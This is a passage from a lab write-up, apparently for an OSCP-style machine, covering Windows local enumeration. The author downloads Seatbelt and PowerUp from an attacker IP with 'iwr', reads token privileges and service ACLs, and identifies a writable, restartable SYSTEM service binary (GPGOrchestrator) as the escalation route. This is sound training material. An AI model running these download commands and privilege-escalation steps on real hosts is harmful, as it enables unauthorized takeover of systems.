# 04 — Local enumeration — the two tools that found the box

Goal: answer two questions with two different tools. **Seatbelt** answers *who am I and what may I
do*; **PowerUp** answers *what on this host is misconfigured*. The service that owns the box is
found by the second, and dismissed-or-confirmed by hand.

---

## 4.1 Get the tools onto the host

```powershell
cd C:\Users\Tim\AppData\Local\Temp
iwr http://192.168.45.158/Seatbelt.exe -OutFile .\Seatbelt.exe
iwr http://192.168.45.158/PowerUp.ps1  -OutFile .\PowerUp.ps1
```

## 4.2 Seatbelt — `-group=all -full`

```powershell
.\Seatbelt.exe -group=all -full
```

The report is large. Four sections decide the whole box.

**`OSInfo`** — the starting position:

```
Hostname            :  oscp
Username            :  OSCP\Tim
ProductName         :  Windows 10 Pro
Build               :  19045.2251
HighIntegrity       :  False
IsLocalAdmin        :  False
```

**`TokenPrivileges`** — the decision point:

```
SeShutdownPrivilege:  DISABLED
SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeUndockPrivilege:  DISABLED
SeIncreaseWorkingSetPrivilege:  DISABLED
SeTimeZonePrivilege:  DISABLED
```

Five benign privileges. **No `SeImpersonatePrivilege`, no `SeAssignPrimaryToken`, no `SeDebug`.**
That single section retires the entire potato family — `GodPotato`, `PrintSpoofer`, `RoguePotato`,
`JuicyPotato` — and any token-stealing route, because every one of them needs one of those
privileges. Reading it here saves an hour of failed `getsystem` variants.

**`LocalGroups`** — confirms the picture: `Tim` is in `Users`; `Administrators` holds `Admin`,
`Administrator`, `cloudbase-init`.

**`InstalledProducts`** — the version that matters:

```
DisplayName    : Mobile Mouse
DisplayVersion : 3.6.4

DisplayName    : MilleGPG5 5.9.1 Ottobre 2022-(x64)
```

Two third-party packages. Mobile Mouse explains the foothold from chapter 03; **MilleGPG5** is the
lead that becomes the escalation.

**`Services`** — the section nobody reads closely enough. It prints `ServiceCommand`,
`BinaryPathSDDL` and `ServiceSDDL` for every service, which is enough to spot a weak ACL without
touching `sc`:

```
Name            : GPGOrchestrator
User            : LocalSystem
State           : Running
StartMode       : Auto
ServiceCommand  : "C:\Program Files\MilleGPG5\GPGService.exe"
BinaryPathSDDL  : O:BAG:...D:AI(A;;FR;;;BU)(A;ID;0x1301bf;;;BU)(A;ID;FA;;;SY)...
ServiceSDDL     : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
                  (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
                  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BU)
```

`0x1301bf` for `BU` in `BinaryPathSDDL` is `FILE_ALL_ACCESS`-adjacent — read, write, delete. And the
final ACE of `ServiceSDDL` gives `BU` `DC`+`RP`+`DT`+`WD`. Both are written down here, before any
tool has an opinion.

## 4.3 PowerUp — the tool that names it

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Narrowly, to skip the noise:

```powershell
Get-ModifiableServiceFile
```

```
ServiceName                     : GPGOrchestrator
Path                            : "C:\Program Files\MilleGPG5\GPGService.exe"
ModifiableFile                  : C:\Program Files\MilleGPG5\GPGService.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'GPGOrchestrator'
CanRestart                      : True
```

That is the finding. `CanRestart: True` is what makes it a privilege escalation rather than a file
upload: PowerUp has already checked that the current user can stop/start the service too.

## 4.4 Signal vs noise

PowerUp also reported `edgeupdate` twice. Both are false positives, and seeing *why* is the useful
part:

| Field | `edgeupdate` (noise) | `GPGOrchestrator` (real) |
|---|---|---|
| `ModifiableFile` | `C:\` — the volume root, not the binary | the executable itself |
| Permission | `AppendData/AddSubdirectory` on the root | **Modify** on the binary |
| `StartName` | LocalSystem | LocalSystem |
| `CanRestart` | **False** | **True** |

`C:\` allows `Authenticated Users` to append a subdirectory — which is true of every Windows install
and grants nothing on the service's own binary. Only the second row is exploitable.

> **Method note.** `CanRestart: False` downgrades any writable-binary finding to "you can write a
> file, you cannot make it run". Always read that flag before planning the escalation — and then
> confirm it by hand, because a scanner's ACL parser is not authoritative.

## 4.5 Which tool answered which question

| Question | Tool / command | Answer |
|---|---|---|
| Which ports exist | `nmap -p- --min-rate 2000` | 80, 5986, 7680, 9099, 9999, 35913 |
| What is on 9099 | `nmap -sV` → `fingerprint-strings`, then `curl -i` | `Mobile Mouse Server` |
| Which version of it | Seatbelt `InstalledProducts` | 3.6.4 |
| Do I have admin rights | Seatbelt `OSInfo` (`IsLocalAdmin`, `HighIntegrity`) | no |
| Can a potato work | Seatbelt `TokenPrivileges` | no `SeImpersonate` |
| What third-party service runs as SYSTEM | Seatbelt `Services` + `InstalledProducts` | `GPGOrchestrator` / MilleGPG5 |
| Can I overwrite and restart it | PowerUp `Get-ModifiableServiceFile` | yes, `CanRestart: True` |
| Is that real | `icacls`, `sc qc`, `sc sdshow` (chapter 05) | yes |
